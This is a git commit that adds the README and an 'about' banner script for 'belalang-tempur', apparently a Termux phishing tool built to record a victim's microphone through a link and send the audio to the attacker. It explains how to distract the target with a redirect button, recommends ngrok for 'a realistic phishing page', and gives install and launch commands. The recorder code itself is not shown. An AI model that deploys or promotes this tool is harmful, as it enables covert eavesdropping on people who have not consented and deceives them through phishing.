c0ea3a714ed96ad74906e88b6aeb3645f479c781
mrjaya88 <138643209+mrjaya88@users.noreply.github.com>
2023-07-05 11:04:01 +0700

    Add files via upload

---
+++ README.md
@@ -0,0 +1,57 @@
+## belalang-tempur:
++ belalang-tempur is a shell programmed tool for Termux and Linux, That can capture voice of your victim. When your victim will open your link then you will receiving audio file in wav frequency from your victim.
+
+## Working:
++ After the user grants microphone permissions, a website redirect button of your choice is released to distract the target while small audio files (about 4 seconds in wav format) are sent to the attacker. It uses [Recorderjs], plugin for recording/exporting the output of Web Audio API nodes.
+
+## Available for:
++ Termux
++ ~Linux~
+
+## Tested on:
++ Termux
++ ~Linux~
+
+## Port Forwarding:
++ Here you can create phishing link using two different types port forwarding.
+
+    + Serveo.net
+    + Ngrok.io
+
+![photo](https://github.com/MrSec-80/belalang-tempur/blob/main/img/firstlook.jpg)
+
+## Recommendation:
++ If you will ask me for it, which one port forwarding is better, then I'll recommend you 'Ngrok.io', Because ngrok is very easy to create a realistic phishing page.
+
+## Installation:
++ ``` pkg update ```
++ ``` pkg upgrade ```
++ ``` pkg install git ```
++ ``` git clone https://github.com/MrSec-80/belalang-tempur.git/ ```
++ ``` cd belalang-tempur ```
++ ``` chmod +x * ```
++ ``` bash setup.sh ```
++ ``` bash traperx.sh ```
+
+### Single Line Installation Command:
+
+``` 
+pkg update && pkg upgrade && pkg install git && git clone https://github.com/MrSec-80/belalang-tempur.git/ && cd belalang-tempur && chmod +x * && bash setup.sh && bash traperx.sh 
+```
+
+## Screenshots:
+
+![photo](https://github.com/MrSec-80/belalang-tempur/blob/main/img/link.jpg)
+![photo](https://github.com/MrSec-80/belalang-tempur/blob/main/img/about.jpg)
+![photo](https://github.com/MrSec-80/belalang-tempur/blob/main/img/audiofile.jpg)
+![photo](https://github.com/MrSec-80/belalang-tempur/blob/main/img/setup.jpg)
+
+### Connect With Us:
+
++ [Instagram](https://instagram.com/0hacker_x0/)
++ [Github](https://github.com/MrSec-80/)
++ [YouTube](https://youtube.com/@Technolex/)
++ [Telegram Channel](https://t.me/hackwithalex/)
++ [Chat With Me](https://wa.me/+917488159482)
+
+### Thank You Guys
---
+++ about/about.sh
@@ -0,0 +1,57 @@
+echo -e "\033[1;96mPress ENTER to continue"
+read arya
+echo -e "\033[1;90mLoading....."
+echo
+sleep 0.6
+clear
+echo
+
+echo -e "\033[1;91m ▄▄▄       ▄▄▄▄    ▒█████   █    ██ ▄▄▄█████▓
+▒████▄    ▓█████▄ ▒██▒  ██▒ ██  ▓██▒▓  ██▒ ▓▒
+▒██  ▀█▄  ▒██▒ ▄██▒██░  ██▒▓██  ▒██░▒ ▓██░ ▒░
+░██▄▄▄▄██ ▒██░█▀  ▒██   ██░▓▓█  ░██░░ ▓██▓ ░ 
+ ▓█   ▓██▒░▓█  ▀█▓░ ████▓▒░▒▒█████▓   ▒██▒ ░ 
+ ▒▒   ▓▒█░░▒▓███▀▒░ ▒░▒░▒░ ░▒▓▒ ▒ ▒   ▒ ░░   
+  ▒   ▒▒ ░▒░▒   ░   ░ ▒ ▒░ ░░▒░ ░ ░     ░    
+  ░   ▒    ░    ░ ░ ░ ░ ▒   ░░░ ░ ░   ░      
+      ░  ░ ░          ░ ░     ░              
+                ░                            
+
+"
+
+echo -e "\033[1;92m[\033[1;97m#\033[1;92m]\033[1;93m belalang-tempur: \033[1;92mTraper-X is a shell programmed tool for Termux and Linux, That can capture voice of your victim. When your victim will open your link then you will receiving audio file in wav frequency from your victim.
+
+\033[1;92m[\033[1;97m#\033[1;92m] \033[1;93mWorking: \033[1;92mAfter the user grants microphone permissions, a website redirect button of your choice is released to distract the target while small audio files (about 4 seconds in wav format) are sent to the attacker. It uses [Recorderjs], plugin for recording/exporting the output of Web Audio API nodes.
+
+\033[1;92m[\033[1;97m#\033[1;92m]\033[1;93m Port forwarding: \033[1;92mHere you can create phishing link using two different types port forwarding.
+
+     \033[1;92m[\033[1;97m1\033[1;92m] \033[1;93mServo.net
+     \033[1;92m[\033[1;97m2\033[1;92m] \033[1;93mNgrok.io
+
+\033[1;92m[\033[1;97m#\033[1;92m] \033[1;93mRecommendation: \033[1;92mIf you will ask me for it, which one port forwarding is better then I'll recommend you 'Ngeok.io', Because ngrok is very easy to create a realistic phishing page.
+
+\033[1;92m[\033[1;97m#\033[1;92m] \033[1;93mMy Social Media ID
+
+\033[1;92m[\033[1;97m1\033[1;92m] Github:
+     (\033[1;97m★\033[1;92m)\033[1;93m Username:\033[1;92m Mr AleX
+     (\033[1;97m√\033[1;92m)\033[1;93m Profile Link:\033[1;94m https://github.com/MrSec-80/
+
+\033[1;92m[\033[1;97m2\033[1;92m] Instagram:
+     (\033[1;97m★\033[1;92m)\033[1;93m Username:\033[1;92m mrhacker.x
+     (\033[1;97m√\033[1;92m)\033[1;93m Profile Link:\033[1;94m https://instagram.com/mrhacker.x/
+
+\033[1;92m[\033[1;97m3\033[1;92m] YouTube:
+     (\033[1;97m★\033[1;92m)\033[1;93m Channel Name:\033[1;92m MrHacker X
+     (\033[1;97m√\033[1;92m)\033[1;93m Channel Link:\033[1;94m https://youtube.com/c/MrAlexxx/
+
+\033[1;92m[\033[1;97m4\033[1;92m] Telegram Channel:
+     (\033[1;97m★\033[1;92m)\033[1;93m Channel Name:\033[1;92m MrHacker X
+     (\033[1;97m√\033[1;92m)\033[1;93m Channel Link:\033[1;94m https://t.me/mrhackersx/
+
+\033[1;92m[\033[1;97m5\033[1;92m] Telegram Chat:
+     (\033[1;97m★\033[1;92m)\033[1;93m Username:\033[1;92m hacker1x
+     (\033[1;97m√\033[1;92m)\033[1;93m Link For Chat:\033[1;94m https://t.me/hacker1x/
+
+"
+
+
